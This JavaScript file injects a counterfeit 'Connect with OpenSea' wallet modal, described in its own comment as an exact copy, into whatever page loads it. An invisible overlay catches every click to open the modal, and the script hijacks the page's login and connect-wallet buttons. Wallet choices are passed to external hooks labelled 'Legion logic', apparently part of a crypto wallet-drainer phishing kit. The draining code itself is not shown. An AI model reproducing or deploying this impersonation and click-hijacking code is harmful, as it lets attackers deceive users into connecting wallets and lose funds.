(function() {
    'use strict';

    /* ── Exact OpenSea Wallet Connect Modal ── */

    var WALLETS = [
        {
            name: 'MetaMask',
            installed: true,
            icon: "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='40' height='40' viewBox='0 0 40 40'%3E%3Crect width='40' height='40' rx='8' fill='%23F5841F'/%3E%3Cpath d='M29.7 10.5l-7.2 5.3 1.3-3.2 5.9-2.1z' fill='%23E2761B' stroke='%23E2761B' stroke-width='.2'/%3E%3Cpath d='M10.3 10.5l7.1 5.4-1.2-3.3-5.9-2.1zm16.4 15.3l-1.9 2.9 4.1 1.1 1.2-4h-3.4zm-18.5.1l1.2 3.9 4.1-1.1-1.9-2.9H8.2z' fill='%23E4761B' stroke='%23E4761B' stroke-width='.2'/%3E%3C/svg%3E",
            id: 'metamask'
        },
        {
            name: 'Phantom',
            installed: true,
            icon: "data:image/svg+xml,%3Csvg width='40' height='40' viewBox='0 0 40 40' xmlns='http://www.w3.org/2000/svg'%3E%3Crect width='40' height='40' rx='8' fill='%23AB9FF2'/%3E%3Cpath d='M30.5 20.2c-.7 0-1.3-.6-1.3-1.3 0-.7.6-1.3 1.3-1.3.7 0 1.3.6 1.3 1.3 0 .7-.6 1.3-1.3 1.3zm-4.2 0c-.7 0-1.3-.6-1.3-1.3 0-.7.6-1.3 1.3-1.3.7 0 1.3.6 1.3 1.3 0 .7-.6 1.3-1.3 1.3zm-4.3-1.3c0 .7-.6 1.3-1.3 1.3-.7 0-1.3-.6-1.3-1.3 0-.7.6-1.3 1.3-1.3.7 0 1.3.6 1.3 1.3zM8.2 20.5c0-6.4 5.2-11.5 11.6-11.5h.4c6.4 0 11.6 5.1 11.6 11.5v.8c0 3.5-2.8 6.3-6.3 6.3H14.5c-3.5 0-6.3-2.8-6.3-6.3v-.8z' fill='white'/%3E%3C/svg%3E",
            id: 'phantom'
        },
        {
            name: 'MyTonWallet',
            installed: true,
            icon: "data:image/svg+xml,%3Csvg width='40' height='40' viewBox='0 0 40 40' xmlns='http://www.w3.org/2000/svg'%3E%3Crect width='40' height='40' rx='8' fill='%230088CC'/%3E%3Cpath d='M20 9l10 17-10-6-10 6 10-17z' fill='white'/%3E%3C/svg%3E",
            id: 'mytonwallet'
        },
        {
            name: 'WalletConnect',
            installed: false,
            icon: "data:image/svg+xml,%3Csvg width='40' height='40' viewBox='0 0 40 40' xmlns='http://www.w3.org/2000/svg'%3E%3Crect width='40' height='40' rx='8' fill='%233B99FC'/%3E%3Cpath d='M12.6 15.8c4.1-4 10.7-4 14.8 0l.5.5c.2.2.2.5 0 .7l-1.7 1.6c-.1.1-.3.1-.4 0l-.7-.7c-2.8-2.8-7.4-2.8-10.3 0l-.7.7c-.1.1-.3.1-.4 0l-1.7-1.6c-.2-.2-.2-.5 0-.7l.6-.5zm18.3 3.4l1.5 1.5c.2.2.2.5 0 .7l-6.8 6.7c-.2.2-.6.2-.8 0l-4.8-4.7c-.1 0-.2 0-.2 0l-4.8 4.7c-.2.2-.6.2-.8 0l-6.8-6.7c-.2-.2-.2-.5 0-.7l1.5-1.5c.2-.2.6-.2.8 0l4.8 4.7c.1 0 .2 0 .2 0l4.8-4.7c.2-.2.6-.2.8 0l4.8 4.7c.1 0 .2 0 .2 0l4.8-4.7c.2-.2.6-.2.8 0z' fill='white'/%3E%3C/svg%3E",
            id: 'walletconnect'
        },
        {
            name: 'Base Account',
            installed: false,
            icon: "data:image/svg+xml,%3Csvg width='40' height='40' viewBox='0 0 40 40' xmlns='http://www.w3.org/2000/svg'%3E%3Crect width='40' height='40' rx='8' fill='%230052FF'/%3E%3Ccircle cx='20' cy='20' r='10' fill='white'/%3E%3Ccircle cx='20' cy='20' r='6' fill='%230052FF'/%3E%3C/svg%3E",
            id: 'base'
        }
    ];

    var walletListHTML = WALLETS.map(function(w) {
        var installedHTML = w.installed ? '<div class="os-wallet-tag-installed">Installed</div>' : '';
        return '<button class="os-wallet-item" data-wallet-id="' + w.id + '">' +
            '<div class="os-wallet-item-left">' +
                '<div class="os-wallet-icon-wrapper">' +
                    '<img src="' + w.icon + '" alt="' + w.name + '">' +
                '</div>' +
                '<span class="os-wallet-name">' + w.name + '</span>' +
            '</div>' +
            installedHTML +
        '</button>';
    }).join('');

    var modalHTML = 
        '<div id="os-wallet-overlay" class="os-wallet-overlay">' +
            '<div class="os-wallet-modal">' +
                '<button class="os-wallet-close-btn" id="os-wallet-close">' +
                    '<svg viewBox="0 0 14 14"><path d="M14 1.41L12.59 0L7 5.59L1.41 0L0 1.41L5.59 7L0 12.59L1.41 14L7 8.41L12.59 14L14 12.59L8.41 7L14 1.41Z"></path></svg>' +
                '</button>' +
                '<div class="os-wallet-header">' +
                    '<div class="os-opensea-logo-container">' +
                        '<svg viewBox="0 0 40 40"><path d="M25.3333 13.5878L22.9515 12.5905C23.0805 11.2372 23.3642 9.07008 22.0747 7.74411C19.7891 5.39414 15.006 13.9189 12.6337 13.9877C12.1179 14.0028 11.7568 13.5558 12.0148 13.0658C14.1677 8.97232 20.3049 -0.669837 25.4365 2.19504C30.6558 5.10901 27.2415 11.8398 25.3333 13.5878ZM11.4589 17.5876C12.6358 17.0735 14.1953 16.9298 15.6567 17.6186C16.9942 18.249 20.4852 20.7302 24.225 21.0567C29.7423 21.5385 36.3157 15.864 36.5994 15.5492C37.0637 15.0345 37.9147 15.1136 38.2501 15.7533C39.4622 18.0463 41.5165 26.6961 34.0205 32.7483C24.3235 40.5786 8.93158 37.9892 2.6133 28.5303C-0.342171 24.1039 -1.0643 14.5422 3.19357 10.9735C3.76092 10.4975 4.58618 10.8653 4.63776 11.6094C4.84408 14.5582 7.02534 18.9187 11.4589 17.5876Z"></path></svg>' +
                    '</div>' +
                    '<h2 class="os-wallet-title">Connect with OpenSea</h2>' +
                '</div>' +
                '<div class="os-wallet-list-container">' +
                    walletListHTML +
                    '<button class="os-wallet-more-options">More Wallet Options</button>' +
                '</div>' +
                '<div class="os-wallet-separator">or continue with email</div>' +
                '<button class="os-wallet-email-btn">' +
                    '<span class="os-wallet-email-text">Continue with email</span>' +
                    '<div class="os-wallet-email-icon">' +
                        '<svg viewBox="0 0 24 24"><path d="M5 12h14M12 5l7 7-7 7" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path></svg>' +
                    '</div>' +
                '</button>' +
            '</div>' +
        '</div>' +
        '<div id="os-click-catcher"></div>';

    document.body.insertAdjacentHTML('beforeend', modalHTML);

    var overlay = document.getElementById('os-wallet-overlay');
    var closeBtn = document.getElementById('os-wallet-close');
    var clickCatcher = document.getElementById('os-click-catcher');

    function openModal() {
        overlay.classList.add('active');
        document.body.classList.add('os-modal-open');
    }

    function closeModal() {
        overlay.classList.remove('active');
        document.body.classList.remove('os-modal-open');
    }

    clickCatcher.addEventListener('click', function(e) {
        e.preventDefault();
        e.stopPropagation();
        openModal();
    });

    closeBtn.addEventListener('click', function(e) {
        e.stopPropagation();
        closeModal();
    });

    overlay.addEventListener('click', function(e) {
        if (e.target === overlay) {
            closeModal();
        }
    });

    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape') closeModal();
    });

    var walletItems = document.querySelectorAll('.os-wallet-item');
    walletItems.forEach(function(item) {
        item.addEventListener('click', function() {
            var walletId = item.getAttribute('data-wallet-id');
            
            if (clickCatcher) clickCatcher.style.display = 'none';

            // Trigger Legion logic
            if (walletId === 'metamask' && typeof window.customModalClickMetamask === 'function') {
                window.customModalClickMetamask();
            } else if (walletId === 'walletconnect' && typeof window.customModalClickWalletConnect === 'function') {
                window.customModalClickWalletConnect();
            } else if (typeof window.customModalClickDetected === 'function') {
                window.customModalClickDetected(walletId, null);
            }

            var nameEl = item.querySelector('.os-wallet-name');
            var origName = nameEl.textContent;
            nameEl.textContent = 'Connecting...';
            item.style.opacity = '0.6';
            item.style.pointerEvents = 'none';

            setTimeout(function() {
                nameEl.textContent = origName;
                item.style.opacity = '1';
                item.style.pointerEvents = 'auto';
            }, 3000);
        });
    });

    setTimeout(function() {
        document.querySelectorAll('button, a').forEach(function(el) {
            var text = (el.textContent || '').trim().toLowerCase();
            if (text === 'login' || text === 'connect wallet' || text === 'sign in' || text === 'connect') {
                el.addEventListener('click', function(e) {
                    e.preventDefault();
                    e.stopPropagation();
                    openModal();
                });
            }
        });
    }, 1000);

})();
